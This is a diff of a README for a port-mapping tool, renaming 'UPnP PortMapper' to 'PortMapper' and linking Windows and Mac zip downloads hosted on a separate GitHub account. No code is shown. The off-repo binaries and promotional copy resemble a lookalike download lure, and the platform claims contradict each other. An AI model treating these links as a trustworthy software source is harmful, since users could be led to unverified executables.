@@ -1,7 +1,7 @@
-# UPnP PortMapper
-![UPnP PortMapper](https://github.com/upnpportmapper/download/blob/main/images/tool.jpeg?raw=true)
+# PortMapper
+![PortMapper](https://github.com/upnpportmapper/download/blob/main/images/tool.jpeg?raw=true)
 ## Downloads
-[![UPnP PortMapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-windows.zip)  |  [![UPnP PortMapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
+[![PortMapper Windows](https://github.com/upnpportmapper/download/blob/main/images/windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-windows.zip)  |  [![PortMapper Mac](https://github.com/upnpportmapper/download/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
 :-------------------------:|:-------------------------:
 [Windows](https://github.com/appdownloads/software/raw/main/upnp-portmapper-windows.zip)             |  [Mac](https://github.com/appdownloads/software/raw/main/upnp-portmapper-mac.zip)
 ### Features
@@ -14,6 +14,6 @@
 - Lifetime Support And Updates Included With Download
 - Compatible With Windows and Mac Operating Systems
 
-UPnP PortMapper is a port mapping tool for Windows, Mac and Linux that enables users to easily manage their port mappings directly from their computer instead of logging into their routers admin control panel everytime. Map TCP/UDP ports from your computer to your router via UPnP (Universal Plug and Play) technology. Open external ports on your routers public (WAN) IP address and forward it to an internal port on your local computer with the built-in port forwarding features. To get started simply download this port mapper and then map any external port to any internal port, it is as simple as that.
+PortMapper is a port mapping tool for Windows, Mac and Linux that enables users to easily manage their port mappings directly from their computer instead of logging into their routers admin control panel everytime. Map TCP/UDP ports from your computer to your router via UPnP (Universal Plug and Play) technology. Open external ports on your routers public (WAN) IP address and forward it to an internal port on your local computer with the built-in port forwarding features. To get started simply download this port mapper and then map any external port to any internal port, it is as simple as that.
 ##### Privacy
 We do not collect any information at all simply because we are not interested in storing your information which would increase our costs and liability, therefore we are only interested in developing high quality software for anyone to use, having said that we are not sure why the rest of the world doesn't also not collect info?
